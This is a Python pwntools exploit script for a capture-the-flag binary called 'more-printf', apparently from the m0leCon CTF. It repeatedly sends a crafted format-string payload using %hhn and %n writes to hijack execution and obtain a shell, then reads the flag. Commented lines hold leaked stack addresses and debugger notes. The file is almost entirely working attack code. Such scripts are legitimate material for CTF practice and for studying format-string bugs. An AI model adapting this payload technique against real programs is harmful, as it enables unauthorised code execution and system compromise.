from pwn import *
import time
binf = ELF("more-printf")
libc = ELF.libc

#break en printf
gs = '''
break *0x00005555555552aa
'''

intentos=0

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)
        # return remote("challs.m0lecon.it",1907)

context.log_level = "error"
# context.aslr = False
print(binf.plt)

# for i in range(0,20):
while True:
    intentos +=1
    try:
        p=start()
        # p.sendline('%'+str(1)+'$n')
        p.sendline('%c%c%c%5c%hhn%*8$d%186326c%5$n')
        p.sendline('cat flag')
        p.unrecv(p.recvn(1, timeout=3))
        print(f"Got shell after {intentos} tries")
        p.interactive()
        break
        # p.sendline('%p'*10)
        # log.info(p.recvall())
    except EOFError:
        print(f"{intentos} tries")
        pass

# 0x55555555c260
# 0x7ffff7af2151
# 0x7ffff7dcf8c0
# 0x7ffff7ff5540
# 0x7fffffffdf00
# 0xf296a3eace47c900
# 0x5555555552c0
# 0x7ffff7a03bf7
# 0x1
# 0x7fffffffdff8

#  b *fprintf+143
#  set $rdi = _IO_stdout

# https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/